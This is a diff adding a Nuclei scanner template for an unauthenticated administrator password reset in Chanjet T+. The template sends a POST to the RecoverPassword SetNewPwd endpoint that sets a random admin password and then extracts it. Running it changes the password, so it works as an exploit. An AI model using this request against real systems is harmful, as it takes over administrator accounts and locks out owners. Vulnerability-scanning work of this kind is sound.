@@ -1,0 +1,49 @@
+id: chanjet-tplus-unauth-update
+
+info:
+  name: Chanjet Tplus - Unauthorized Password Update
+  author: 0xr2r
+  severity: high
+  description: |
+    There is an unauthorized administrator password modification vulnerability in UF Chanjet T+ RecoverPassword.aspx. An attacker can use this vulnerability to modify the administrator account password to log in to the backend.
+  reference:
+    - https://cn-sec.com/archives/1377207.html
+    - https://www.chanjet.com
+  metadata:
+    verified: true
+  tags: tplus,unauth,chanjet,intrusive
+
+variables:
+  password: '{{randstr}}'
+  hash: '{{md5("{{password}}")}}'
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      {"pwdNew":"{{hash}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '^\{\s*"value"\s*:\s*true\s*\}$'
+
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"Password: " + password'
+# digest: 4a0a00473045022100d86a6b95384aef2d3076ae5b812359a0507329111ffcaeb50ab5891c61ce72c7022032924c44f485ea89c3fba0be6e84650092f0b96a6241de361d44df74a5944c0f:922c64590222798bb761d5b6d8e72950
